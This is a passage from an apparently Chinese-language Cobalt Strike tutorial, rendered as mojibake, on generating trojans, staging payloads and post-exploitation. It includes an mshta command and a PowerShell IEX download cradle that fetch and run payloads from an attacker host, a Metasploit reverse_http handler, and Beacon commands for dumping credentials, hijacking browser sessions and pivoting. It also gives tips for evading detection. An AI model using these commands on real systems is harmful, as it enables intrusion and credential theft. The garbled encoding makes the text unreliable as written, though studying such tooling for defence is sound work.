æ˜¾ç¤ºæ‰€æœ‰ä»¥è·å–çš„å—å®³ä¸»æœºçš„å‡­è¯ï¼Œå¦‚hashdumpã€Mimikatz[+] Downloads # æŸ¥çœ‹å·²ä¸‹è½½æ–‡ä»¶[+] Event Log # ä¸»æœºä¸Šçº¿è®°å½•ä»¥åŠå›¢é˜Ÿåä½œèŠå¤©è®°å½•[+] Keystrokes # æŸ¥çœ‹é”®ç›˜è®°å½•ç»“æœ[+] Proxy Pivots # æŸ¥çœ‹ä»£ç†æ¨¡å—[+] Screenshots # æŸ¥çœ‹æ‰€æœ‰å±å¹•æˆªå›¾[+] Script Console # åŠ è½½ç¬¬ä¸‰æ–¹è„šæœ¬ä»¥å¢å¼ºåŠŸèƒ½ [+] Targets # æ˜¾ç¤ºæ‰€æœ‰å—å®³ä¸»æœº[+] Web Log # æ‰€æœ‰WebæœåŠ¡çš„æ—¥å¿— 3ã€Attacksï¼ˆ1ï¼‰Packages[+] HTML Application # ç”Ÿæˆ(executable/VBA/powershell)è¿™ä¸‰ç§åŸç†å®ç°çš„æ¶æ„HTAæœ¨é©¬æ–‡ä»¶[+] MS Office Macro # ç”Ÿæˆofficeå®ç—…æ¯’æ–‡ä»¶[+] Payload Generator # ç”Ÿæˆå„ç§è¯­è¨€ç‰ˆæœ¬çš„payload[+] USB/CD AutoPlay # ç”Ÿæˆåˆ©ç”¨è‡ªåŠ¨æ’­æ”¾è¿è¡Œçš„æœ¨é©¬æ–‡ä»¶[+] Windows Dropper # æ†ç»‘å™¨èƒ½å¤Ÿå¯¹ä»»æ„çš„æ­£å¸¸æ–‡ä»¶è¿›è¡Œæ†ç»‘(å…æ€æ•ˆæœå·®)[+] Windows Executable # ç”Ÿæˆå¯æ‰§è¡Œexeæœ¨é©¬[+] Windows Executable(Stageless) # ç”Ÿæˆæ— çŠ¶æ€çš„å¯æ‰§è¡Œexeæœ¨é©¬ ï¼ˆ2ï¼‰Web Drive-by[+] Manage # å¯¹å¼€å¯çš„webæœåŠ¡è¿›è¡Œç®¡ç†[+] Clone Site # å…‹éš†ç½‘ç«™ï¼Œå¯ä»¥è®°å½•å—å®³è€…æäº¤çš„æ•°æ®[+] Host File # æä¾›æ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥é€‰æ‹©Mimeç±»å‹[+] Scripted Web Delivery # ä¸ºpayloadæä¾›webæœåŠ¡ä»¥ä¾¿ä¸‹è½½å’Œæ‰§è¡Œï¼Œç±»ä¼¼äºMetasploitçš„web_delivery [+] Signed Applet Attack # ä½¿ç”¨javaè‡ªç­¾åçš„ç¨‹åºè¿›è¡Œé’“é±¼æ”»å‡»(è¯¥æ–¹æ³•å·²è¿‡æ—¶)[+] Smart Applet Attack # è‡ªåŠ¨æ£€æµ‹javaç‰ˆæœ¬å¹¶è¿›è¡Œæ”»å‡»ï¼Œé’ˆå¯¹Java 1.6.0_45ä»¥ä¸‹ä»¥åŠJava 1.7.0_21ä»¥ä¸‹ç‰ˆæœ¬(è¯¥æ–¹æ³•å·²è¿‡æ—¶)[+] System Profiler # ç”¨æ¥è·å–ç³»ç»Ÿä¿¡æ¯ï¼Œå¦‚ç³»ç»Ÿç‰ˆæœ¬ï¼ŒFlashç‰ˆæœ¬ï¼Œæµè§ˆå™¨ç‰ˆæœ¬ç­‰[+] Spear Phish # é±¼å‰é’“é±¼é‚®ä»¶ 4ã€Reporting[+] Activity Report # æ´»åŠ¨æŠ¥å‘Š[+] Hosts Report # ä¸»æœºæŠ¥å‘Š[+] Indicators of Compromise # IOCæŠ¥å‘Šï¼šåŒ…æ‹¬C2é…ç½®æ–‡ä»¶çš„æµé‡åˆ†æã€åŸŸåã€IPå’Œä¸Šä¼ æ–‡ä»¶çš„MD5 hashes[+] Sessions Report # ä¼šè¯æŠ¥å‘Š[+] Social Engineering Report # ç¤¾ä¼šå·¥ç¨‹æŠ¥å‘Šï¼šåŒ…æ‹¬é±¼å‰é’“é±¼é‚®ä»¶åŠç‚¹å‡»è®°å½•[+] Tactics, Techniques, and Procedures # æˆ˜æœ¯æŠ€æœ¯åŠç›¸å…³ç¨‹åºæŠ¥å‘Šï¼šåŒ…æ‹¬è¡ŒåŠ¨å¯¹åº”çš„æ¯ç§æˆ˜æœ¯çš„æ£€æµ‹ç­–ç•¥å’Œç¼“è§£ç­–ç•¥[+] Reset Data # é‡ç½®æ•°æ®[+] Export Data # å¯¼å‡ºæ•°æ®ï¼Œå¯¼å‡º.tsvæ–‡ä»¶æ ¼å¼ 5ã€Help[+] Homepage # å®˜æ–¹ä¸»é¡µ[+] Support # æŠ€æœ¯æ”¯æŒ[+] Arsenal # å¼€å‘è€…[+] System information # ç‰ˆæœ¬ä¿¡æ¯[+] About # å…³äº 6ã€å·¥å…·æ  1.æ–°å»ºè¿æ¥2.æ–­å¼€å½“å‰è¿æ¥3.ç›‘å¬å™¨4.æ”¹å˜è§†å›¾ä¸ºPivot Graph(è§†å›¾åˆ—è¡¨)5.æ”¹å˜è§†å›¾ä¸ºSession Table(ä¼šè¯åˆ—è¡¨)6.æ”¹å˜è§†å›¾ä¸ºTarget Table(ç›®æ ‡åˆ—è¡¨)7.æ˜¾ç¤ºæ‰€æœ‰å·²è·å–çš„å—å®³ä¸»æœºçš„å‡­è¯8.æŸ¥çœ‹å·²ä¸‹è½½æ–‡ä»¶9.æŸ¥çœ‹é”®ç›˜è®°å½•ç»“æœ10.æŸ¥çœ‹å±å¹•æˆªå›¾11.ç”Ÿæˆæ— çŠ¶æ€çš„å¯æ‰§è¡Œexeæœ¨é©¬12.ä½¿ç”¨javaè‡ªç­¾åçš„ç¨‹åºè¿›è¡Œé’“é±¼æ”»å‡»13.ç”Ÿæˆofficeå®ç—…æ¯’æ–‡ä»¶14.ä¸ºpayloadæä¾›webæœåŠ¡ä»¥ä¾¿ä¸‹è½½å’Œæ‰§è¡Œ15.æä¾›æ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥é€‰æ‹©Mimeç±»å‹16.ç®¡ç†Cobalt Strikeä¸Šè¿è¡Œçš„webæœåŠ¡17.å¸®åŠ©18.å…³äº å››ã€åŸºæœ¬æµç¨‹1ã€åˆ›å»ºç›‘å¬å™¨ç‚¹å‡»Cobalt Strike -&gt; Listeners-&gt;Addï¼Œå…¶ä¸­å†…ç½®äº†8ä¸ªListener [+] Beacon DNS[+] Beacon HTTP[+] Beacon HTTPS[+] Beacon SMB[+] Beacon TCP[+] External C2[+] Foreign HTTP[+] Foreign HTTPS å…¶ä¸­ Beacon_xx ä¸ºå†…ç½®ç›‘å¬å™¨ï¼ŒåŒ…æ‹¬DNSã€HTTPã€HTTPSã€SMBã€TCPäº”ç§æ–¹å¼çš„ç›‘å¬å™¨ï¼›Foreignç³»åˆ—ä¸ºå¤–éƒ¨ç›‘å¬å™¨ï¼Œé€šå¸¸ä¸Metasploitæˆ–è€…Armitageè”åŠ¨ã€‚ Nameä»»æ„ï¼Œé€‰æ‹©æ‰€éœ€çš„payloadï¼ŒHostä¸ºæœ¬æœºIPï¼Œportä¸ºæ²¡æœ‰è¢«å ç”¨çš„ä»»æ„ç«¯å£ç‚¹å‡»saveå³åˆ›å»ºæˆåŠŸ 2ã€ç”Ÿæˆæœ¨é©¬è¿™é‡Œé€‰æ‹©å…¶ä¸­ä¸€ç§æ”»å‡»æ–¹å¼ä½œç¤ºèŒƒï¼Œåé¢å†åšè¯¦ç»†è§£é‡Šï¼š ç‚¹å‡»Attacks-&gt;Packages-&gt;HTML Applicationï¼Œé€‰æ‹©å¯¹åº”çš„ç›‘å¬å™¨ï¼Œæ–¹æ³•è¿™é‡Œæœ‰ä¸‰ç§(executable/VBA/powershell)ï¼Œé€‰æ‹©powershellï¼Œç‚¹å‡»Generateç”Ÿæˆï¼Œé€‰æ‹©ç”Ÿæˆçš„è·¯å¾„åŠæ–‡ä»¶åä¿å­˜å³å¯ã€‚ 3ã€å¼€å¯WebæœåŠ¡ç‚¹å‡»Attacks-&gt;Web Drive-by-&gt;Host Fileï¼Œé€‰æ‹©åˆšåˆšç”Ÿæˆçš„æœ¨é©¬evil.htaï¼Œç‚¹å‡»Launchç”Ÿæˆä¸‹è½½é“¾æ¥ 4ã€è¿è¡Œæœ¨é©¬æ‰“å¼€å—å®³æœºcmdï¼Œè¿è¡Œmshtaå‘½ä»¤ã€‚mshta.exeæ˜¯å¾®è½¯Windowsæ“ä½œç³»ç»Ÿç›¸å…³ç¨‹åºï¼Œç”¨äºæ‰§è¡Œ.HTAæ–‡ä»¶ã€‚ mshta http://192.168.100.117:8080/download/file.ext è¿”å›CSå³å¯çœ‹åˆ°è‚‰é¸¡ä¸Šçº¿ é€‰ä¸­å—å®³æœºå³å‡»ï¼Œé€‰æ‹©interactï¼Œå³å¯è¿›è¡Œäº¤äº’ï¼Œç”±äºå—å®³æœºé»˜è®¤60ç§’è¿›è¡Œä¸€æ¬¡å›ä¼ ï¼Œä¸ºäº†å®éªŒæ•ˆæœæˆ‘ä»¬è¿™é‡ŒæŠŠæ—¶é—´è®¾ç½®æˆ5ï¼Œä½†å®é™…ä¸­é¢‘ç‡ä¸å®œè¿‡å¿«ï¼Œå®¹æ˜“è¢«å‘ç°ã€‚ æˆ–è€…åœ¨è¿™é‡Œæ›´æ”¹å¿ƒè·³æ—¶é—´ å¤‡æ³¨ï¼šbeaconçš„å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½è¾ƒå°‘ç”¨èµ·æ¥ä¸æ–¹ä¾¿ï¼Œå¯ä»¥ä½¿ç”¨Ladonè„šæœ¬ã€‚ Ladonè„šæœ¬ä¸‹è½½åœ°å€ï¼šhttps://github.com/k8gege/Ladon Ladonå…·ä½“ä½¿ç”¨æ–¹æ³•ï¼šhttps://github.com/k8gege/Aggressor è¿™é‡Œå†é¡ºå˜´æä¸€å¥å¦å¤–çš„ç”Ÿæˆå’Œåˆ©ç”¨æœ¨é©¬æ–¹æ³•ï¼šAttacksâ€”â€”Web Driver-byâ€”â€”Scripted Web Deliveryï¼ˆSï¼‰ powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.100.117:80/a&#x27;))&quot; 5ã€ææƒå¦‚æœä½¿ç”¨çš„æ˜¯å…¶ä»–payloadæ¯”å¦‚ Windows Executableï¼Œé‚£ä¹ˆå¯ä»¥ææƒ å¾€ç›‘å¬å™¨ç”Ÿæˆexeæœ¨é©¬ é¶æœºå¯åŠ¨exe æˆåŠŸä¸Šçº¿ åœ¨ä¸Šçº¿ä¸»æœºå³é”®åï¼Œç‚¹å‡»ææƒï¼Œé€‰æ‹©uacææƒã€‚ æˆåŠŸåä¼šå‡ºç°ä¸€ä¸ªæ–°çš„ä¸»æœºã€‚ä¹‹åçš„æ“ä½œå¯ä»¥åœ¨æ–°çš„ä¸»æœºè¿›è¡Œã€‚ä½†é—æ†¾çš„æ˜¯è¿™é‡Œææƒå¤±è´¥äº† å°è¯•ä½¿ç”¨svcææƒä¹Ÿå¤±è´¥â€¦..è¿™é‡Œå°±ä¸çº ç»“æˆåŠŸä¸å¦çš„é—®é¢˜äº†ï¼Œæ‡‚å¾—æœ‰ææƒè¿™ä¸ªåŠŸèƒ½å³å¯ 6ã€å¯¼å‡ºæŠ¥å‘Šç‚¹å‡»Reporting-&gt;Activity Reportï¼Œå¯¼å‡ºé»˜è®¤PDFæ–‡æ¡£ äº”ã€Beaconå½“å—å®³æœºä¸Šçº¿ä»¥åï¼Œå³å‡»é€‰æ‹©Interactï¼Œå°±å¯ä»¥æ‰“å¼€Beacon Console åœ¨beaconå¤„è¾“å…¥helpå¯ä»¥çœ‹åˆ°å‘½ä»¤è¯´æ˜ Beacon Commands=============== Command Description ------- ----------- argue è¿›ç¨‹å‚æ•°æ¬ºéª— blockdlls åœ¨å­è¿›ç¨‹ä¸­é˜»æ­¢éMicrosoftçš„DLLsæ–‡ä»¶ browserpivot æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹ bypassuac ç»•è¿‡UAC cancel å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½ cd åˆ‡æ¢ç›®å½• checkin å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡ clear æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ— connect é€šè¿‡TCPè¿æ¥åˆ°Beacon covertvpn éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯ cp å¤åˆ¶æ–‡ä»¶ dcsync ä»DCä¸­æå–å¯†ç å“ˆå¸Œ desktop è¿œç¨‹VNC dllinject åå°„DLLæ³¨å…¥è¿›ç¨‹ dllload ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­ download ä¸‹è½½æ–‡ä»¶ downloads åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½ drives åˆ—å‡ºç›®æ ‡ç›˜ç¬¦ elevate å°è¯•ææƒ execute åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º) ï¼ˆæ‰§è¡Œexecute notepadåï¼Œç”¨æˆ·åªèƒ½åœ¨ä»»åŠ¡ç®¡ç†å™¨ç­‰åå°æŸ¥çœ‹åˆ°è¿›ç¨‹ï¼‰ execute-assembly åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åº exit é€€å‡ºbeacon getprivs å¯¹å½“å‰ä»¤ç‰Œå¯ç”¨ç³»ç»Ÿæƒé™ getsystem å°è¯•è·å–SYSTEMæƒé™ getuid è·å–ç”¨æˆ·ID hashdump è½¬å‚¨å¯†ç å“ˆå¸Œå€¼ help å¸®åŠ© inject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­ç”Ÿæˆä¼šè¯ï¼ˆå¦‚æœæœ¨é©¬ä¾ç„¶åœ¨å†…å­˜ä¸­è¿è¡Œï¼Œé‚£ä¹ˆç”¨æˆ·å°è¯•åˆ é™¤æ—¶ä¼šå‘ç°è¿è¡Œä¸­æ— æ³•åˆ é™¤å¯¼è‡´å¼•èµ·ç–‘å¿ƒï¼Œå› æ­¤è·å–shellåæœ€å¥½æŠŠæœ¨é©¬æ³¨å…¥åˆ°(ç³»ç»Ÿ)è¿›ç¨‹ï¼‰ jobkill æ€æ­»ä¸€ä¸ªåå°ä»»åŠ¡ jobs åˆ—å‡ºåå°ä»»åŠ¡ kerberos_ccache_use ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯ kerberos_ticket_purge æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ® kerberos_ticket_use ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯ keylogger é”®ç›˜è®°å½• kill ç»“æŸè¿›ç¨‹ link é€šè¿‡å‘½åç®¡é“è¿æ¥åˆ°Beacon logonpasswords ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼ ls åˆ—å‡ºæ–‡ä»¶ make_token åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ® mimikatz è¿è¡Œmimikatz mkdir åˆ›å»ºä¸€ä¸ªç›®å½• mode dns ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon) mode dns-txt ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon) mode dns6 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon) mode http ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“ mv ç§»åŠ¨æ–‡ä»¶ net netå‘½ä»¤ note ç»™å½“å‰ç›®æ ‡æœºå™¨å¤‡æ³¨ portscan è¿›è¡Œç«¯å£æ‰«æ powerpick é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤ powershell é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤ powershell-import å¯¼å…¥powershellè„šæœ¬ ppid ä¸ºç”Ÿæˆçš„post-exä»»åŠ¡è®¾ç½®çˆ¶PID ps æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨ psexec ä½¿ç”¨æœåŠ¡åœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ psexec_psh ä½¿ç”¨PowerShellåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ psinject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤ pth ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œ pwd å½“å‰ç›®å½•ä½ç½® reg æŸ¥è¯¢æ³¨å†Œè¡¨ rev2self æ¢å¤åŸå§‹ä»¤ç‰Œ rm åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ rportfwd ç«¯å£è½¬å‘ run åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º) runas ä»¥å¦ä¸€ä¸ªç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº runasadmin åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åº runu åœ¨å¦ä¸€ä¸ªPIDä¸‹æ‰§è¡Œç¨‹åº screenshot å±å¹•æˆªå›¾ setenv è®¾ç½®ç¯å¢ƒå˜é‡ shell cmdæ‰§è¡Œå‘½ä»¤ shinject å°†shellcodeæ³¨å…¥è¿›ç¨‹ shspawn ç”Ÿæˆè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­ sleep è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´ socks å¯åŠ¨SOCKS4ä»£ç† socks stop åœæ­¢SOCKS4 spawn ç”Ÿæˆä¸€ä¸ªä¼šè¯ spawnas ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½ç”Ÿæˆä¼šè¯ spawnto å°†å¯æ‰§è¡Œç¨‹åºæ³¨å…¥è¿›ç¨‹ spawnu åœ¨å¦ä¸€ä¸ªPIDä¸‹ç”Ÿæˆä¼šè¯ ssh ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœº ssh-key ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœº steal_token ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ timestomp å°†ä¸€ä¸ªæ–‡ä»¶æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ unlink æ–­å¼€ä¸Beaconçš„è¿æ¥ upload ä¸Šä¼ æ–‡ä»¶ wdigest ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ® winrm ä½¿ç”¨WinRMåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ wmi ä½¿ç”¨WMIåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ å¯ç”¨help+å‘½ä»¤çš„æ–¹å¼æŸ¥çœ‹å…·ä½“å‘½ä»¤å‚æ•°è¯´æ˜ beacon&gt; help argueUse: argue [command] [fake arguments] argue [command] argueSpoof [fake arguments] for [command] processes launched by Beacon.This option does not affect runu/spawnu, runas/spawnas, or post-ex jobs.Use argue [command] to disable this feature for the specified command.Use argue by itself to list programs with defined spoofed arguments. ä¹‹å‰è¯´è¿‡CSä¸å—å®³æœºé»˜è®¤60sè¿›è¡Œä¸€æ¬¡äº¤äº’ï¼Œä¸ºäº†æ–¹ä¾¿å®éªŒæˆ‘ä»¬å¯ä»¥æŠŠæ—¶é—´è®¾ç½®ä¸º0 beacon&gt;sleep 0 è·å–åˆ°Beaconå Interact æ‰“å¼€beaconAccess dumphashes è·å–hash Elevate ææƒ GoldenTicket ç”Ÿæˆé»„é‡‘ç¥¨æ®æ³¨å…¥å½“å‰ä¼šè¯ MAketoken å‡­è¯è½¬æ¢ RunMimikatz è¿è¡ŒMimikatz SpawnAs ç”¨å…¶ä»–ç”¨æˆ·ç”ŸæˆCobaltStrikeä¾¦å¬å™¨Explore BrowserPivot åŠ«æŒç›®æ ‡æµè§ˆå™¨è¿›ç¨‹ Desktop(VNC) æ¡Œé¢äº¤äº’ FileBrowser æ–‡ä»¶æµè§ˆå™¨ NetView å‘½ä»¤Net View Portscan ç«¯å£æ‰«æ Processlist è¿›ç¨‹åˆ—è¡¨ Screenshotæˆªå›¾Pivoting SOCKSServer ä»£ç†æœåŠ¡ Listener åå‘ç«¯å£è½¬å‘ DeployVPN éƒ¨ç½²VPNSpawn æ–°çš„é€šè®¯æ¨¡å¼å¹¶ç”Ÿæˆä¼šè¯Session ä¼šè¯ç®¡ç† å¤‡æ³¨ï¼Œåˆ é™¤ï¼Œå¿ƒè·³æ—¶é—´ï¼Œé€€å‡º ä¸‹é¢æˆ‘å°±ä»‹ç»ä¸€ä¸‹å‡ ä¸ªå¸¸ç”¨çš„å‘½ä»¤ 1ã€browserpivotBrowser Pivotæ˜¯ä¸€ä¸ªé’ˆå¯¹IEæµè§ˆå™¨çš„æŠ€æœ¯ï¼Œåˆ©ç”¨çš„æ˜¯IEçš„cookieæœºåˆ¶ï¼ŒCobalt Strikeé€šè¿‡IEæ³¨å…¥è¿›ç¨‹ä»¥ç»§æ‰¿ç”¨æˆ·çš„å·²éªŒè¯Webä¼šè¯ï¼Œè¾¾åˆ°æ— éœ€éªŒè¯ç™»å½•ç”¨æˆ·è®¿é—®çš„ç½‘ç«™ã€‚ å‡è®¾å—å®³è€…åœ¨é€šè¿‡IEæµè§ˆå™¨ç™»å½•äº†ç½‘ç«™åå° æˆ‘ä»¬å¯ä»¥é€šè¿‡psæ‰¾åˆ°æµè§ˆå™¨è¿›ç¨‹ï¼Œç„¶åé€šè¿‡å‘½ä»¤è¿›è¡Œæ³¨å…¥ beacon&gt; browserpivot 2600 x86 è¿™é‡Œä¹‹æ‰€ä»¥é€‰æ‹©PID 2600æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦æ’å…¥Internet Explorerä»¥ç»§æ‰¿ç”¨æˆ·çš„å·²éªŒè¯Webä¼šè¯ã€‚IEçš„æ–°ç‰ˆæœ¬ä¼šä¸ºæ¯ä¸ªé€‰é¡¹å¡ç”Ÿæˆä¸€ä¸ªè¿›ç¨‹ï¼Œæˆ‘ä»¬å¿…é¡»å°†å…¶æ’å…¥å­é€‰é¡¹å¡ä»¥ç»§æ‰¿ä¼šè¯çŠ¶æ€ã€‚é€šå¸¸ï¼Œå­é€‰é¡¹å¡å…±äº«æ‰€æœ‰ä¼šè¯çŠ¶æ€ã€‚é€šè¿‡æŸ¥çœ‹PPIDå€¼æ¥æ ‡è¯†IEå­é€‰é¡¹å¡è¿›ç¨‹ï¼Œå½“PPIDå¼•ç”¨explorer.exeæ—¶ï¼Œè¯¥è¿›ç¨‹ä¸æ˜¯å­é€‰é¡¹å¡ï¼›å½“PPIDå¼•ç”¨iexplore.exeæ—¶ï¼Œè¯¥è¿›ç¨‹å°±æ˜¯å­é€‰é¡¹å¡ã€‚ å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡å›¾å½¢ç•Œé¢æ³¨å…¥ï¼Œå³å‡»é€‰ä¸­Explore-&gt;Browser Pivot ç„¶åæµè§ˆå™¨è®¾ç½®ä»£ç†ä¸ºé»‘å®¢ä¸»æœºå³æœ¬æœº ç„¶åè®¿é—®å—å®³è€…æ‰€è®¿é—®çš„ç½‘é¡µï¼Œå‘ç°æ— éœ€ç™»å½•ç›´æ¥è¿›å…¥åå° 2ã€Socksä»£ç†å¼€å¯socks4aä»£ç†ï¼Œé€šè¿‡ä»£ç†è¿›è¡Œå†…ç½‘æ¸—é€ å¼€å¯socksï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å³é”®Pivoting-&gt;SOCKS Server beacon&gt; socks 2222[+] started SOCKS4a server on: 2222[+] host called home, sent: 16 bytes ç„¶åvim /etc/proxychains.confï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ socks4ä»£ç†æœåŠ¡å™¨ ä½¿ç”¨proxychainsä»£ç†æ‰«æå†…ç½‘ä¸»æœº proxychains nmap -sP 192.168.183.0/24 æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡éš§é“å°†æ•´ä¸ªmsfå¸¦è¿›ç›®æ ‡å†…ç½‘ ç‚¹å‡»View-&gt;Proxy Pivotsï¼Œé€‰æ‹©Socks4a Proxyï¼Œç‚¹å‡»Tunnelï¼š setg Proxies socks4:192.168.183.147:2222 æ‰“å¼€msfå¯¹å†…ç½‘è¿›è¡Œæ‰«æ å…³é—­socks beacon&gt;socks stop 3ã€powershell-importè¿™ä¸ªåŠŸèƒ½åœ¨åæ¸—é€æµ‹è¯•ä¸­å¾ˆæœ‰ç”¨ï¼Œå¯ä»¥å¯¼å…¥å„ç§powershellæ¸—é€æ¡†æ¶ï¼Œå¦‚Nishangã€PowerSploitæ”»å‡»æ¡†æ¶ åœ¨beacon shellè¾“å…¥powershell-importï¼Œå¯¼å…¥å·²æœ‰çš„psæ–‡ä»¶ beacon&gt; powershell-import å…³äºå…·ä½“æœ‰å“ªäº›å‘½ä»¤å¯ä»¥æ“ä½œå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ç›¸åº”psæ–‡ä»¶ å…­ã€é™„å½•çˆ†ç ´cobalt strikeå¯†ç è„šæœ¬ï¼šhttps://github.com/ryanohoro/csbruter ä¸ƒã€ä¸MSFè”åŠ¨Kali IPï¼š172.16.20.18 å—å®³è€…æœºå™¨ï¼š172.16.20.20 CSï¼š172.16.20.19 1ã€åœ¨MSFä¸­åˆ›å»ºç›‘å¬å™¨msf5 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httppayload =&gt; windows/meterpreter/reverse_httpmsf5 exploit(multi/handler) &gt; set lhost 172.16.20.18lhost =&gt; 172.16.20.18msf5 exploit(multi/handler) &gt; set lport 3333lport =&gt; 3333msf5 exploit(multi/handler) &gt; run æ³¨ï¼šç›‘å¬å™¨ç›‘å¬kaliè‡ªèº«åœ°å€ã€‚ 2ã€åœ¨CSä¸­è®¾ç½®æ–°çš„ç›‘å¬åœ°å€ æ³¨æ„ï¼špayloadè¦ä¸msfä¸­çš„payloadè¦ä¸€è‡´ã€‚ åœ¨æ§åˆ¶ä¸­å³é”®â€“å¢åŠ ä¼šè¯ï¼Œé€‰æ‹©msfçš„ä¼šè¯ã€‚ æ­¤æ—¶æ‹¿åˆ°meterpreterã€‚ è¾“å…¥shellï¼Œè¿›å…¥ä¸»æœºå‘½ä»¤æ“ä½œã€‚ å…«ã€Aggressor Script1ã€Sleepç¯å¢ƒçš„æ­å»ºAggressor Scriptï¼šæ˜¯C2 3.0ä»¥ä¸Šç‰ˆæœ¬çš„ä¸€ä¸ªå†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä»–æ˜¯ç”±Sleepè„šæœ¬è§£æï¼ŒSleepè„šæœ¬ç›®å‰å›½å†…æ˜¯æ²¡æœ‰ä¸­æ–‡ç‰ˆæœ¬çš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºä½¿ç”¨çš„äººä¸å¤š Sleepè¯­è¨€ä¸‹è½½åœ°å€ï¼šhttp://sleep.dashnine.org/download/sleep.jar å¿«é€Ÿä½¿ç”¨ï¼š java -jar sleep.jar è¾“å‡ºhello worldï¼šæ–°å»ºä¸€ä¸ªcnaæ–‡ä»¶ï¼Œcnaæ˜¯Aggressor Scripè„šæœ¬çš„åç¼€ï¼Œç„¶ååœ¨é‡Œé¢å†™ï¼š println(&quot;hello word&quot;); ç„¶ååŠ è½½ä¸€ä¸‹ 2ã€ç®€ä»‹åœ¨ C2 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€ Aggressor Scriptçš„æ§åˆ¶å° è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ helpæŸ¥çœ‹ä¸€äº›å¸®åŠ©ä¿¡æ¯ï¼š ä¸‹é¢æ˜¯ä»‹ç»ï¼š ï¼ˆ1ï¼‰ï¼Ÿï¼Ÿè¿›è¡Œä¸€ä¸ªç®€å•çš„åˆ¤æ–­ï¼Œè¿”å›å€¼ä¸ºTrueæˆ–è€…Falseï¼Œä¾‹å¦‚ ? int(1) == int(2) è¿”å›ä¸ºFalse ï¼ˆ2ï¼‰ee æ‰§è¡Œæˆ‘ä»¬å†™çš„ä»£ç ï¼Œç›¸å½“äºäº¤äº’æ¨¡å¼ï¼Œå¦‚æœä¸åŠ ä¸Š e çš„è¯æ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œä¾‹å¦‚ e println(&quot;hello world&quot;)ï¼š ï¼ˆ3ï¼‰helpè¿™ä¸ªå°±æ˜¯æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ï¼Œæˆ‘ä»¬åœ¨å¼€å¤´ä½¿ç”¨è¿‡ ï¼ˆ4ï¼‰loadloadåŠ è½½cnaè„šæœ¬ï¼Œè¿™é‡Œæˆ‘åŠ è½½ä¸€ä¸ªè„šæœ¬ï¼šload &lt;cna path&gt; è¿™é‡ŒåŠ è½½çš„ cna å†…å®¹ä¸ºï¼š command w&#123; println(&quot;hello world!&quot;);&#125; æ„æ€æ˜¯åˆ›å»ºä¸€ä¸ª command åå­—ä¸º wï¼Œå½“è¾“å…¥wçš„æ—¶å€™å°±æ‰“å°hello wordã€‚ 